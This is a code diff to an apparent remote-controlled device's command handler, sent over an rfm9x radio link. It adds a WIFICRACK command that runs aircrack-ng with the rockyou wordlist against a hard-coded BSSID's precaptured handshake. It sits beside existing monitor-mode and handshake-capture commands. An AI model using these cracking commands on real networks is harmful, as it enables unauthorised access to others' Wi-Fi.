@@ -429,7 +429,7 @@ class ScanBluetoothCommand(Command):
         handler.send_response(result, handler.rfm9x)
         handler.send_final_token()
 
-class WifiSetupCommand(Command):
+class WiFiSetupCommand(Command):
     name = "WIFISETUP"
 
     def execute(self, args, handler):
@@ -438,8 +438,6 @@ class WifiSetupCommand(Command):
         #subprocess.run(checkKillCmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         monitorModeCmd = ["sudo", "airmon-ng", "start", "wlan1"]
         result = subprocess.run(monitorModeCmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, universal_newlines=True)
-        # TODO: Check result
-        
         handler.send_response(result.stdout)
         handler.send_final_token()
 
@@ -466,6 +464,15 @@ class WiFiScanCommand(Command):
         os.remove('handshk-01.kismet.csv')
         os.remove('handshk-01.kismet.netxml')
         os.remove('handshk-01.log.csv')
+
+class WiFiCrackCommand(Command):
+    name = "WIFICRACK"
+
+    def execute(self, args, handler):
+        aircrackCmd = ["sudo", "aircrack-ng", "-b", "b0:b2:1c:a9:29:ad", "precaptured-handshake.cap", "-w", "/usr/share/wordlists/rockyou.txt"]
+        result = subprocess.run(aircrackCmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, universal_newlines=True)
+        handler.send_response(result.stdout)
+        handler.send_final_token()
 
 class RunCommand(Command):
     name = "RUN"
@@ -535,8 +542,9 @@ class CommandHandler:
             CameraCommand(),
             ResendCommand(), 
             ScanBluetoothCommand(),
-            WifiSetupCommand(),
+            WiFiSetupCommand(),
             WiFiScanCommand(),
+            WiFiCrackCommand(),
             RunCommand(),
         ])
 
